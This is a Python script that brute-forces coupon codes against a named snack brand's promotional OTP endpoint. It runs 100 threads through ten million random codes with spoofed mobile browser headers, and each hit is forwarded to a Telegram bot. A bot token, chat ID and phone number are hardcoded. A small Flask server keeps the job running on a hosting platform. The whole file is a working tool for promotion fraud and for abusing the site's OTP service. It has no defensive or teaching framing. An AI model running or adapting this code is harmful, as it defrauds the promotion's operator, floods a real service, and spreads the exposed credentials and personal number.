from flask import Flask
import requests
import random
import string
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor
import os
import sys
from datetime import datetime

# --- TELEGRAM CONFIG ---
TELEGRAM_BOT_TOKEN = "7960235034:AAGspuayD8vd-CnAkGp1LjpUv2RhcoopqKU"
TELEGRAM_CHAT_ID = "7177581474"

def send_telegram(code):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": f"🎉 Valid TikTac Coupon Found: `{code}`",
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

# --- MINI PING SERVER TO KEEP RENDER ALIVE ---
app = Flask(__name__)

@app.route("/")
def home():
    return "OK"

threading.Thread(
    target=lambda: app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000))),
    daemon=True
).start()

# --- ORIGINAL SCRIPT CONSTANTS ---
REAL_PHONE = "8837571150"
NUM_THREADS = 100
NUM_CODES_TO_TRY = 10000000
DELAY_PER_REQUEST = 0.3
START_WITH_D = False
SAVE_FILE = "VALID_TICTAC_COUPONS_LIVE.txt"

BASE_URL = "https://jarpecarpromo.tictac.com"
REGISTER_URL = f"{BASE_URL}/in/en/xp/jarpecarpromo/home/register"
OTP_URL = f"{BASE_URL}/in/en/xp/jarpecarpromo/home/generateOTP/"

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.116 Mobile Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Referer': REGISTER_URL,
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': BASE_URL,
    'Connection': 'keep-alive',
}

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

total_checked = 0
valid_found = 0
stats_lock = threading.Lock()

def save_valid_coupon(code):
    file_lock = threading.Lock()
    with file_lock:
        with open(SAVE_FILE, "a") as f:
            f.write(code + "\n")

def generate_coupon():
    chars = string.ascii_uppercase + string.digits
    prefix = random.choice(string.ascii_uppercase)
    return prefix + ''.join(random.choice(chars) for _ in range(5))

def check_coupon(code, session, phone):
    data = {'phone': phone, 'ccode': code}
    try:
        response = session.post(OTP_URL, data=data, headers=HEADERS, timeout=15)
        if response.status_code != 200:
            return False, "Server error"

        try:
            result = response.json()
        except:
            return False, "Bad response"

        if result.get('status') == 'success':
            return True, "VALID - OTP SENT!"
        else:
            return False, "Invalid"
    except:
        return False, "Timeout/Error"

def worker(thread_id, codes_to_check, phone):
    global total_checked, valid_found
    session = requests.Session()
    session.headers.update(HEADERS)
    try:
        session.get(REGISTER_URL, timeout=15)
    except:
        pass

    for code in codes_to_check:
        with stats_lock:
            total_checked += 1

        print(f"{Colors.OKBLUE}[Thread {thread_id:2d}]{Colors.ENDC} Testing → {Colors.BOLD}{code}{Colors.ENDC}", end="")

        is_valid, msg = check_coupon(code, session, phone)

        if is_valid:
            with stats_lock:
                valid_found += 1
            print(f"  →  {Colors.OKGREEN}✓ {msg}{Colors.ENDC}")
            save_valid_coupon(code)
            send_telegram(code)
            print(f"{Colors.OKGREEN}{Colors.BOLD}Code sent to Telegram & saved!{Colors.ENDC}\n")
        else:
            print(f"  →  {Colors.FAIL}✗ {msg}{Colors.ENDC}")

        time.sleep(DELAY_PER_REQUEST)

def print_status():
    start = time.time()
    while not stop_event.is_set():
        with stats_lock:
            checked = total_checked
            found = valid_found
        rate = checked / max(1, (time.time() - start))
        print(f"\r{Colors.OKCYAN}Checked: {checked:,} | Valid: {found} | Speed: {rate:.1f} codes/sec{Colors.ENDC}", end="", flush=True)
        time.sleep(0.5)
    print("\r" + " " * 80 + "\r", end="")

stop_event = threading.Event()

def main():
    global total_checked, valid_found
    os.system('cls' if os.name == 'nt' else 'clear')

    print(f"{Colors.OKGREEN}Starting TikTac coupon scanner on Render… 🚀{Colors.ENDC}\n")

    if not os.path.exists(SAVE_FILE):
        open(SAVE_FILE, "w").close()

    all_codes = [generate_coupon() for _ in range(NUM_CODES_TO_TRY)]
    chunk_size = max(1, len(all_codes) // NUM_THREADS)
    code_chunks = [all_codes[i:i + chunk_size] for i in range(0, len(all_codes), chunk_size)]

    status_thread = threading.Thread(target=print_status, daemon=True)
    status_thread.start()

    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(worker, i+1, chunk, REAL_PHONE) for i, chunk in enumerate(code_chunks) if chunk]
        try:
            for future in futures:
                future.result()
        except KeyboardInterrupt:
            print(f"\n{Colors.FAIL}Stopping scanner…{Colors.ENDC}")
            stop_event.set()

    stop_event.set()
    status_thread.join(timeout=1)

    print(f"\n{Colors.HEADER}{Colors.BOLD}SCAN COMPLETE{Colors.ENDC}")
    print(f"{Colors.OKCYAN}Total Checked : {total_checked:,}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Valid Found   : {valid_found}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Saved file    : {SAVE_FILE}{Colors.ENDC}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.FAIL}Script terminated by user.{Colors.ENDC}")
        sys.exit(0)
